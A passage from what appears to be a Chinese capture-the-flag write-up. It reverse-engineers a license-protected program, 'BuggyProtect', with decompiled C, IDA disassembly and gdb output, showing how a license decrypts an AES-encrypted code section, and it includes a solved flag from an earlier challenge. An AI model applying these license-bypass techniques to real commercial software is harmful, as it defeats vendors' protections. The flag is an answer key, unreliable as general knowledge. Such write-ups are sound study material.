class="built_in">chr</span>(bit_detrans(each)) <span class="keyword">for</span> each <span class="keyword">in</span> tmp]</span><br><span class="line">print(<span class="string">&#x27;&#x27;</span>.join(ans))  <span class="comment"># nuaactf&#123;Haa!You_G0t_1t!&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="BuggyProtect"><a href="#BuggyProtect" class="headerlink" title="BuggyProtect"></a>BuggyProtect</h3><h4 id="初窥"><a href="#初窥" class="headerlink" title="初窥"></a>初窥</h4><p>拿到程序后，首先尝试运行，发现会返回一个选单<br>如果无法运行，需要自己安装一下<code>openssl 1.1.x</code>版本。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Welcome to my tiny software</span><br><span class="line">1. register</span><br><span class="line">2. cow say</span><br><span class="line">3. check flag</span><br><span class="line">4. trial license</span><br><span class="line">0. exit</span><br><span class="line">Your choice:</span><br></pre></td></tr></table></figure>
<ol>
<li>输入注册码</li>
<li>You have no license to run this feature.</li>
<li>You have no license to run this feature.</li>
<li>得到一个试用注册码</li>
</ol>
<p>显而易见，我们需要把从<code>4</code>中拿到的注册码通过<code>1</code>注册一下。然后再尝试运行<code>2, 3</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Your choice: 2</span><br><span class="line">please input &gt;123123456</span><br><span class="line">&#x2F; 123123456 \</span><br><span class="line">  \ ^__^</span><br><span class="line">    (oo)\_______</span><br><span class="line">    (__)\       )\&#x2F;\</span><br><span class="line">        ||----w |</span><br><span class="line">        ||     ||</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">Your choice: 3</span><br><span class="line">You have no license to run this feature.</span><br></pre></td></tr></table></figure>

<p>我们这个注册码并不能成功的执行check_flag函数。</p>
<h4 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h4><p>显而易见，我们反编译的重点应该放在<code>1. register</code>上，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">__int64 sub_1220()</span><br><span class="line">&#123;</span><br><span class="line">  signed int v0; &#x2F;&#x2F; ebp</span><br><span class="line">  bool v1; &#x2F;&#x2F; cf</span><br><span class="line">  bool v2; &#x2F;&#x2F; zf</span><br><span class="line">  signed __int64 v3; &#x2F;&#x2F; rcx</span><br><span class="line">  const char *v4; &#x2F;&#x2F; rsi</span><br><span class="line">  __int64 *v5; &#x2F;&#x2F; rdi</span><br><span class="line">  signed __int64 v6; &#x2F;&#x2F; rcx</span><br><span class="line">  const char *v7; &#x2F;&#x2F; rsi</span><br><span class="line">  __int64 *v8; &#x2F;&#x2F; rdi</span><br><span class="line">  char v9; &#x2F;&#x2F; al</span><br><span class="line">  bool v10; &#x2F;&#x2F; cf</span><br><span class="line">  bool v11; &#x2F;&#x2F; zf</span><br><span class="line">  __int64 v13; &#x2F;&#x2F; [rsp+0h] [rbp-4B8h]</span><br><span class="line">  char v14; &#x2F;&#x2F; [rsp+80h] [rbp-438h]</span><br><span class="line">  unsigned __int64 v15; &#x2F;&#x2F; [rsp+488h] [rbp-30h]</span><br><span class="line"></span><br><span class="line">  v0 &#x3D; -2;</span><br><span class="line">  v15 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  memset(&amp;v14, 0, 0x400uLL);</span><br><span class="line">  puts(&quot;paste license here:&quot;);</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      fgets((char *)&amp;v13, 128, stdin);</span><br><span class="line">      v3 &#x3D; 25LL;</span><br><span class="line">      v4 &#x3D; &quot;-----BEGIN LICENSE-----\n&quot;;</span><br><span class="line">      v5 &#x3D; &amp;v13;</span><br><span class="line">      do</span><br><span class="line">      &#123;</span><br><span class="line">        if ( !v3 )</span><br><span class="line">          break;</span><br><span class="line">        v1 &#x3D; (const unsigned __int8)*v4 &lt; *(_BYTE *)v5;</span><br><span class="line">        v2 &#x3D; *v4++ &#x3D;&#x3D; *(_BYTE *)v5;</span><br><span class="line">        v5 &#x3D; (__int64 *)((char *)v5 + 1);</span><br><span class="line">        --v3;</span><br><span class="line">      &#125;</span><br><span class="line">      while ( v2 );</span><br><span class="line">      v6 &#x3D; 23LL;</span><br><span class="line">      v7 &#x3D; &quot;-----END LICENSE-----\n&quot;;</span><br><span class="line">      v8 &#x3D; &amp;v13;</span><br><span class="line">      v9 &#x3D; (!v1 &amp;&amp; !v2) - v1;</span><br><span class="line">      v10 &#x3D; 0;</span><br><span class="line">      v11 &#x3D; v9 &#x3D;&#x3D; 0;</span><br><span class="line">      if ( v9 )</span><br><span class="line">        break;</span><br><span class="line">      do</span><br><span class="line">      &#123;</span><br><span class="line">        if ( !v6 )</span><br><span class="line">          break;</span><br><span class="line">        v10 &#x3D; (const unsigned __int8)*v7 &lt; *(_BYTE *)v8;</span><br><span class="line">        v11 &#x3D; *v7++ &#x3D;&#x3D; *(_BYTE *)v8;</span><br><span class="line">        v8 &#x3D; (__int64 *)((char *)v8 + 1);</span><br><span class="line">        --v6;</span><br><span class="line">      &#125;</span><br><span class="line">      while ( v11 );</span><br><span class="line">      if ( (!v10 &amp;&amp; !v11) &#x3D;&#x3D; v10 )</span><br><span class="line">        goto LABEL_16;</span><br><span class="line">      v0 &#x3D; 1;</span><br><span class="line">    &#125;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">      if ( !v6 )</span><br><span class="line">        break;</span><br><span class="line">      v10 &#x3D; (const unsigned __int8)*v7 &lt; *(_BYTE *)v8;</span><br><span class="line">      v11 &#x3D; *v7++ &#x3D;&#x3D; *(_BYTE *)v8;</span><br><span class="line">      v8 &#x3D; (__int64 *)((char *)v8 + 1);</span><br><span class="line">      --v6;</span><br><span class="line">    &#125;</span><br><span class="line">    while ( v11 );</span><br><span class="line">    if ( (!v10 &amp;&amp; !v11) &#x3D;&#x3D; v10 )</span><br><span class="line">      break;</span><br><span class="line">    if ( v0 &gt; 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 &#x3D; (const char *)&amp;v13;</span><br><span class="line">      __strcat_chk(&amp;v14, &amp;v13, 1024LL);</span><br><span class="line">    &#125;</span><br><span class="line">    ++v0;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v0 !&#x3D; 8 );</span><br><span class="line">LABEL_16:</span><br><span class="line">  sub_16A0(&amp;v14, v7);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对应的函数从控制台读入了license，并调用了<code>sub_16a0</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall sub_16A0(const char *a1)</span><br><span class="line">&#123;</span><br><span class="line">  const char *v1; &#x2F;&#x2F; rbx</span><br><span class="line">  int v2; &#x2F;&#x2F; eax</span><br><span class="line">  __int64 v3; &#x2F;&#x2F; rdi</span><br><span class="line">  unsigned int v4; &#x2F;&#x2F; ebp</span><br><span class="line">  _BYTE *v5; &#x2F;&#x2F; r13</span><br><span class="line">  __int64 v6; &#x2F;&#x2F; rax</span><br><span class="line">  __int64 v7; &#x2F;&#x2F; r12</span><br><span class="line">  __int64 v8; &#x2F;&#x2F; rax</span><br><span class="line">  __int64 v9; &#x2F;&#x2F; rbx</span><br><span class="line">  __int64 v10; &#x2F;&#x2F; rax</span><br><span class="line">  unsigned int v11; &#x2F;&#x2F; er12</span><br><span class="line">  __int64 v12; &#x2F;&#x2F; rbx</span><br><span class="line">  __int64 v13; &#x2F;&#x2F; rbp</span><br><span class="line">  int v14; &#x2F;&#x2F; eax</span><br><span class="line">  __m128i *v15; &#x2F;&#x2F; rbx</span><br><span class="line">  __int64 v16; &#x2F;&#x2F; rax</span><br><span class="line">  int v17; &#x2F;&#x2F; eax</span><br><span class="line">  size_t v18; &#x2F;&#x2F; rbp</span><br><span class="line">  __int64 v19; &#x2F;&#x2F; rsi</span><br><span class="line">  char *v20; &#x2F;&#x2F; rdi</span><br><span class="line">  __int64 v21; &#x2F;&#x2F; r14</span><br><span class="line">  __int64 v22; &#x2F;&#x2F; rax</span><br><span class="line">  char *v23; &#x2F;&#x2F; r13</span><br><span class="line">  int v24; &#x2F;&#x2F; er12</span><br><span class="line">  unsigned __int64 v25; &#x2F;&#x2F; rdi</span><br><span class="line">  __int64 *v26; &#x2F;&#x2F; rbx</span><br><span class="line">  __int64 v27; &#x2F;&#x2F; rax</span><br><span class="line">  int v28; &#x2F;&#x2F; [rsp+Ch] [rbp-8Ch]</span><br><span class="line">  __m128i v29; &#x2F;&#x2F; [rsp+10h] [rbp-88h]</span><br><span class="line">  __m128i v30; &#x2F;&#x2F; [rsp+20h] [rbp-78h]</span><br><span class="line">  __m128i v31; &#x2F;&#x2F; [rsp+30h] [rbp-68h]</span><br><span class="line">  __m128i v32; &#x2F;&#x2F; [rsp+40h] [rbp-58h]</span><br><span class="line">  __int64 v33; &#x2F;&#x2F; [rsp+50h] [rbp-48h]</span><br><span class="line">  unsigned __int64 v34; &#x2F;&#x2F; [rsp+58h] [rbp-40h]</span><br><span class="line"></span><br><span class="line">  v1 &#x3D; a1;</span><br><span class="line">  v34 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  v2 &#x3D; strlen(a1);</span><br><span class="line">  v3 &#x3D; v2;</span><br><span class="line">  v4 &#x3D; v2;</span><br><span class="line">  v5 &#x3D; malloc(v2);</span><br><span class="line">  v6 &#x3D; BIO_f_base64(v3);</span><br><span class="line">  v7 &#x3D; BIO_new(v6);</span><br><span class="line">  v8 &#x3D; BIO_new_mem_buf(v1, v4);</span><br><span class="line">  v9 &#x3D; BIO_push(v7, v8);</span><br><span class="line">  BIO_ctrl(v9, 11LL, 0LL, 0LL);</span><br><span class="line">  v10 &#x3D; (signed int)BIO_read(v9, v5, v4);</span><br><span class="line">  v5[v10] &#x3D; 0;</span><br><span class="line">  v11 &#x3D; v10;</span><br><span class="line">  BIO_free_all(v9);</span><br><span class="line">  __printf_chk(1LL, &quot;b64decode size: %d\n&quot;, v11);</span><br><span class="line">  v12 &#x3D; BIO_new_mem_buf(&amp;unk_2031AC, &amp;unk_20336F - &amp;unk_2031AC);</span><br><span class="line">  v13 &#x3D; PEM_read_bio_RSA_PUBKEY(v12, 0LL, 0LL, 0LL);</span><br><span class="line">  BIO_free(v12);</span><br><span class="line">  if ( v13 )</span><br><span class="line">  &#123;</span><br><span class="line">    v14 &#x3D; RSA_size(v13);</span><br><span class="line">    v15 &#x3D; (__m128i *)malloc(v14);</span><br><span class="line">    RSA_public_decrypt(v11, v5, v15, v13, 1LL);</span><br><span class="line">    RSA_free(v13);</span><br><span class="line">    v16 &#x3D; v15[4].m128i_i64[0];</span><br><span class="line">    v29 &#x3D; _mm_loadu_si128(v15);</span><br><span class="line">    v33 &#x3D; v16;</span><br><span class="line">    v30 &#x3D; _mm_loadu_si128(v15 + 1);</span><br><span class="line">    v31 &#x3D; _mm_loadu_si128(v15 + 2);</span><br><span class="line">    v32 &#x3D; _mm_loadu_si128(v15 + 3);</span><br><span class="line">    free(v15);</span><br><span class="line">  &#125;</span><br><span class="line">  v17 &#x3D; getpagesize();</span><br><span class="line">  v18 &#x3D; v17;</span><br><span class="line">  v19 &#x3D; v17;</span><br><span class="line">  v20 &#x3D; (char *)sub_19C0 - (unsigned __int64)sub_19C0 % v17;</span><br><span class="line">  mprotect(v20, v17, 7);</span><br><span class="line">  v21 &#x3D; EVP_CIPHER_CTX_new(v20, v19);</span><br><span class="line">  v22 &#x3D; EVP_aes_256_cbc();</span><br><span class="line">  EVP_DecryptInit(v21, v22, &amp;v29, &amp;v31);</span><br><span class="line">  EVP_CIPHER_CTX_set_padding(v21, 0LL);</span><br><span class="line">  v23 &#x3D; (char *)malloc((char *)term_proc - (char *)sub_19C0 + 16);</span><br><span class="line">  EVP_DecryptUpdate(v21, v23, &amp;v28, sub_19C0, (unsigned int)((char *)term_proc - (char *)sub_19C0));</span><br><span class="line">  v24 &#x3D; v28;</span><br><span class="line">  EVP_DecryptFinal(v21, &amp;v23[v28], &amp;v28);</span><br><span class="line">  memcpy(sub_19C0, v23, v24 + v28);</span><br><span class="line">  free(v23);</span><br><span class="line">  v25 &#x3D; qword_2033A0;</span><br><span class="line">  if ( qword_2033A0 )</span><br><span class="line">  &#123;</span><br><span class="line">    v26 &#x3D; &amp;qword_2033A0;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">      while ( !(v26[1] &amp; v33) )</span><br><span class="line">      &#123;</span><br><span class="line">        v26 +&#x3D; 2;</span><br><span class="line">        v25 &#x3D; *v26;</span><br><span class="line">        if ( !*v26 )</span><br><span class="line">          return;</span><br><span class="line">      &#125;</span><br><span class="line">      v26 +&#x3D; 2;</span><br><span class="line">      mprotect((void *)(v25 - v25 % v18), v18, 7);</span><br><span class="line">      v27 &#x3D; *(v26 - 2);</span><br><span class="line">      *(_DWORD *)v27 &#x3D; 0x90909090;</span><br><span class="line">      *(_BYTE *)(v27 + 4) &#x3D; 0x90u;</span><br><span class="line">      v25 &#x3D; *v26;</span><br><span class="line">    &#125;</span><br><span class="line">    while ( *v26 );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>sub_16a0</code> 完成了base64解码，rsa解密，aes_cbc解密，并在解密后将一段内存替换为了<code>90 90 90 90 90</code>。如果敏感的话，这里明显是在替换成<code>nop ...</code>指令。不过没发现也没事，我们可以后面动态调试。<br>明显，<code>  EVP_DecryptInit(v21, v22, &amp;v29, &amp;v31);</code> 对应KEY和IV的参数，都是由RSA解密后的数据<code>v15</code>来的，因此要重点关心一下AES到底解密了啥。<br><code>EVP_DecryptUpdate(v21, v23, &amp;v28, sub_19C0, (unsigned int)((char *)term_proc - (char *)sub_19C0));</code> 这里传入的地址是<code>sub_19c0</code>，size是<code>term_proc - sub_19c0</code>,跳转到<code>sub_19c0</code>看看</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">protected:00000000000019C0 sub_19C0        proc far                ; CODE XREF: .text:00000000000011C5↑j</span><br><span class="line">protected:00000000000019C0                                         ; DATA XREF: sub_16A0:loc_17E4↑o</span><br><span class="line">protected:00000000000019C0 ; __unwind &#123;</span><br><span class="line">protected:00000000000019C0                 mov     cl, 57h ; &#39;W&#39;</span><br><span class="line">protected:00000000000019C2                 movsd</span><br><span class="line">protected:00000000000019C3                 retf</span><br><span class="line">protected:00000000000019C3 sub_19C0        endp</span><br><span class="line">protected:00000000000019C3</span><br><span class="line">protected:00000000000019C3 ; ---------------------------------------------------------------------------</span><br><span class="line">protected:00000000000019C4                 dd 0AAE07FBCh</span><br><span class="line">protected:00000000000019C8                 dq 7377960DB082A6D4h, 20A9907265E37A56h, 0C0EE3002F6A022F1h</span><br><span class="line">protected:00000000000019C8                 dq 0DA34CA6597E060D2h, 0AD3F087F2F712AC0h, 2D449E3657B67092h</span><br><span class="line">protected:00000000000019C8                 dq 7EFBF76461C835AEh, 0CA3A2F1F6BD9C3A3h, 44B78C39C5EE967Ah</span><br><span class="line">protected:00000000000019C8                 dq 0BA132C2118113477h, 0D6DCF6649B92C65Dh, 7EA2578B98A01ED3h</span><br><span class="line">protected:00000000000019C8                 dq 3B48240BB1C350CFh, 0D0CDD055EE84C8F7h, 54F5B8F0F927AAAAh</span><br><span class="line">protected:00000000000019C8                 dq 0D5EF5F140160B5E1h, 17B1445512CA5AB0h, 9193B2F97B725AC1h</span><br><span class="line">protected:00000000000019C8                 dq 0A28AF713CBDAFE8Eh, 452618AF1E34DB28h, 2C94F9D13D155D4Ah</span><br><span class="line">protected:00000000000019C8                 dq 3CD909CDB9D105F9h, 53EE901A203FBEBAh, 84D147C50674ECA7h</span><br><span class="line">protected:00000000000019C8                 dq 6815A1F60179F284h, 0D40D3484C66C7EAFh, 47B12282C741B298h</span><br><span class="line">protected:00000000000019C8                 dq 1059744C56A877AEh, 0FAE0DECEEFA7103Eh, 85F0F585625C21AEh</span><br><span class="line">protected:00000000000019C8                 dq 2D22E7585454836Ah, 21BB08002B85E034h, 0ACE68E35258784ADh</span><br><span class="line">protected:00000000000019C8                 dq 0CA93D3F3A06681A9h, 390139D8389DAE1Bh, 7F6DB02B671BDCA6h</span><br><span class="line">protected:00000000000019C8                 dq 3FFD7505BF5864CBh, 0D6B332ADAF3D2C2Dh, 33747267742F7E1Bh</span><br><span class="line">protected:00000000000019C8                 dq 5CEE44A063A998B0h, 1BF088761D678E3Bh, 568B6B1E008B5677h</span><br><span class="line">protected:00000000000019C8                 dq 347C9E9758B15A65h, 0D835A24E41DA0EB7h, 0AA9D8572FF22DE1Ah</span><br><span class="line">protected:00000000000019C8                 dq 59F18E6141D961Dh, 4F1BD2919272156h, 0D9C5BE02E9E0499Dh</span><br><span class="line">protected:00000000000019C8                 dq 0C70AF6C49C77BBB7h, 3363804DF15B98B1h, 90B880C5D3C90256h</span><br><span class="line">protected:00000000000019C8                 dq 21EC795F29E0F199h, 51AEF1B5DD2BCF23h, 8F730FCA2104083Eh</span><br><span class="line">protected:00000000000019C8                 dq 59EA15EF9297BFACh, 3C27A1FDE8C44BBEh, 0C957D242993A0F03h</span><br><span class="line">protected:00000000000019C8                 dq 7280FE25FA7A99A6h, 4F05DE22E472D254h</span><br><span class="line">protected:00000000000019C8 ; &#125; &#x2F;&#x2F; starts at 1A80</span><br><span class="line">protected:00000000000019C8 protected       ends</span><br><span class="line">protected:00000000000019C8</span><br><span class="line">.fini:0000000000001BA0 ; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">.fini:0000000000001BA0</span><br><span class="line">.fini:0000000000001BA0 ; Segment type: Pure code</span><br><span class="line">.fini:0000000000001BA0 ; Segment permissions: Read&#x2F;Execute</span><br><span class="line">.fini:0000000000001BA0 _fini           segment dword public &#39;CODE&#39; use64</span><br><span class="line">.fini:0000000000001BA0                 assume cs:_fini</span><br><span class="line">.fini:0000000000001BA0                 ;org 1BA0h</span><br><span class="line">.fini:0000000000001BA0                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing</span><br><span class="line">.fini:0000000000001BA0</span><br><span class="line">.fini:0000000000001BA0 ; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; S U B R O U T I N E &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">.fini:0000000000001BA0</span><br><span class="line">.fini:0000000000001BA0</span><br><span class="line">.fini:0000000000001BA0                 public _term_proc</span><br><span class="line">.fini:0000000000001BA0 _term_proc      proc near               ; DATA XREF: sub_16A0+14B↑o</span><br><span class="line">.fini:0000000000001BA0                 sub     rsp, 8</span><br><span class="line">.fini:0000000000001BA4                 add     rsp, 8</span><br><span class="line">.fini:0000000000001BA8                 retn</span><br><span class="line">.fini:0000000000001BA8 _term_proc      endp</span><br><span class="line">.fini:0000000000001BA8</span><br><span class="line">.fini:0000000000001BA8 _fini           ends</span><br><span class="line">.fini:0000000000001BA8</span><br></pre></td></tr></table></figure>
<p>明显看出，<code>19c0</code>处的汇编代码是错误的，后面也全都是乱码，解密的区域也是这堆数据，而且这个section名字也不是<code>.text</code>。</p>
<h4 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h4><p>此时我们就要gdb挂上看一看解密完了到底是啥了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">0x5555555559c0:      push   %rbx</span><br><span class="line">   0x5555555559c1:      lea    0x275(%rip),%rsi        # 0x555555555c3d</span><br><span class="line">   0x5555555559c8:      mov    $0x1,%edi</span><br><span class="line">   0x5555555559cd:      sub    $0x90,%rsp</span><br><span class="line">   0x5555555559d4:      mov    %fs:0x28,%rax</span><br><span class="line">   0x5555555559dd:      mov    %rax,0x88(%rsp)</span><br><span class="line">   0x5555555559e5:      xor    %eax,%eax</span><br><span class="line">   0x5555555559e7:      mov    %rsp,%rbx</span><br><span class="line">   0x5555555559ea:      callq  0x555555554dc0 &lt;__printf_chk@plt&gt;</span><br><span class="line">   0x5555555559ef:      lea    0x256(%rip),%rdi        # 0x555555555c4c</span><br><span class="line">   0x5555555559f6:      mov    %rbx,%rsi</span><br><span class="line">   0x5555555559f9:      xor    %eax,%eax</span><br><span class="line">   0x5555555559fb:      callq  0x555555554f20 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x555555555a00:      lea    0x24b(%rip),%rsi        # 0x555555555c52</span><br><span class="line">   0x555555555a07:      mov    %rbx,%rdx</span><br><span class="line">   0x555555555a0a:      mov    $0x1,%edi</span><br><span class="line">   0x555555555a0f:      xor    %eax,%eax</span><br><span class="line">   0x555555555a11:      callq  0x555555554dc0 &lt;__printf_chk@plt&gt;</span><br><span class="line">   0x555555555a16:      lea    0x23d(%rip),%rdi        # 0x555555555c5a</span><br><span class="line">   0x555555555a1d:      callq  0x555555554db0 &lt;puts@plt&gt;</span><br><span class="line">   0x555555555a22:      lea    0x23a(%rip),%rdi        # 0x555555555c63</span><br><span class="line">   0x555555555a29:      callq  0x555555554db0 &lt;puts@plt&gt;</span><br><span class="line">   0x555555555a2e:      lea    0x23f(%rip),%rdi        # 0x555555555c74</span><br><span class="line">   0x555555555a35:      callq  0x555555554db0 &lt;puts@plt&gt;</span><br><span class="line">   0x555555555a3a:      lea    0x248(%rip),%rdi        # 0x555555555c89</span><br><span class="line">   0x555555555a41:      callq  0x555555554db0 &lt;puts@plt&gt;</span><br><span class="line">   0x555555555a46:      lea    0x24e(%rip),%rdi        # 0x555555555c9b</span><br><span class="line">   0x555555555a4d:      callq  0x555555554db0 &lt;puts@plt&gt;</span><br><span class="line">   0x555555555a52:      mov    0x88(%rsp),%rcx</span><br><span 